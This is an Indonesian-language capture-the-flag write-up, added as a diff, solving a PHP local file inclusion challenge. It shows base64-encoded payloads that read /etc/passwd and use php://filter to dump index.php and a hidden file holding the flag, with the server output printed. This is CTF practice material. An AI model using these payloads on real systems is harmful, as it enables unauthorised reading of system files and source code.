@@ -1,0 +1,59 @@
+1. buat check LFI(local file include) vulnerable
+	/etc/passwd -> ubah ke base64, lalu menjadi --> http://103.145.226.168:3034/index.php?page=L2V0Yy9wYXNzd2Q=
+	root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
+	// ternyata rentan
+2. input filter php untuk mendapatkan source code index.php
+	// note : bila php di gnti dengan "" ubah php jadi --> pphphp
+	php://filter/convert.base64-encode/resource=index.php -> ubah ke base64 
+	//lalu menjadi => http://103.145.226.168:3034/index.php?page=cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA= 
+// dapat ini
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5NeSBXZWJzaXRlPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8aDEgc3R5bGU9IiI+V2VsY29tZSB0byBNeSBXZWJzaXRlPC9oMT4KCiAgICA8YSBocmVmPSJpbmRleC5waHAiPkhvbWU8L2E+IHwKICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWMybDBkWE5mZDJWaUxuQm9jQT09Ij5CbG9nIDE8L2E+IHwKICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFIUnRiQzV3YUhBPSI+QmxvZyAyPC9hPiB8CiAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1aR0Z5YTI1bGRDNXdhSEE9Ij5CbG9nIDM8L2E+CgogICAgPGhyLz4KCiAgICA8P3BocAogICAgICAvLyBzc3NoaGhoCiAgICAgIHJlcXVpcmVfb25jZSAiMVN6S1JMUTlXamZpRm5HSk5vdnhPN3lwMERBVnFlNVQucGhwIjsKCiAgICAgIC8vIHN1cGVyIHNlY3VyZSBMRkkgZmlsdGVyCiAgICAgIGlmIChpc3NldCgkX0dFVFsncGFnZSddKSl7CiAgICAgICAgJHBhZ2UgPSBiYXNlNjRfZGVjb2RlKCRfR0VUWydwYWdlJ10pOwogICAgICAgICRwYWdlID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhZ2UpOwogICAgICAgIGluY2x1ZGUgJHBhZ2U7CiAgICAgIH0KICAgICAgZWxzZXsKICAgICAgICAgIGVjaG8gIjxwPkluaSBoYWxhbWEgdXRhbWEuIE1hYXAgZ2FiaXNhIGRlc2lnbiB3ZWIgOig8L3A+IjsKICAgICAgfQogICAgPz4KCiAgPC9ib2R5Pgo	8L2h0bWw+
+
+// decode base64 dapat ini :
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>My Website</title>
+  </head>
+  <body>
+    <h1 style="">Welcome to My Website</h1>
+
+    <a href="index.php">Home</a> |
+    <a href="index.php?page=c2l0dXNfd2ViLnBocA==">Blog 1</a> |
+    <a href="index.php?page=aHRtbC5waHA=">Blog 2</a> |
+    <a href="index.php?page=ZGFya25ldC5waHA=">Blog 3</a>
+
+    <hr/>
+
+    <?php
+      // ssshhhh
+      require_once "1SzKRLQ9WjfiFnGJNovxO7yp0DAVqe5T.php"; --> intresting 
+
+      // super secure LFI filter
+      if (isset($_GET['page'])){
+        $page = base64_decode($_GET['page']);
+        $page = str_replace("../","",$page);
+        include $page;
+      }
+      else{
+          echo "<p>Ini halama utama. Maap gabisa design web :(</p>";
+      }
+    ?>
+
+  </body>
+</html>
+
+3. lalu coba liat isi dari php tersebut dengan cara sama seperti nomer 2
+	php://filter/convert.base64-encode/resource=1SzKRLQ9WjfiFnGJNovxO7yp0DAVqe5T.php
+	// encode bs64
+		http://103.145.226.168:3034/index.php?page=cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0xU3pLUkxROVdqZmlGbkdKTm92eE83eXAwREFWcWU1VC5waHA=
+	
+
+	// didapat :
+		PD9waHAKICAgICRzZWNyZXQgPSAiU1RJS09NRkVTVHtMRkk/X3QwMF8zel80X20zX2QwMGR9IjsKPz4=
+4. decode that and get the flag --> 
+	<?php
+	    $secret = "STIKOMFEST{LFI?_t00_3z_4_m3_d00d}";
+	?>
+
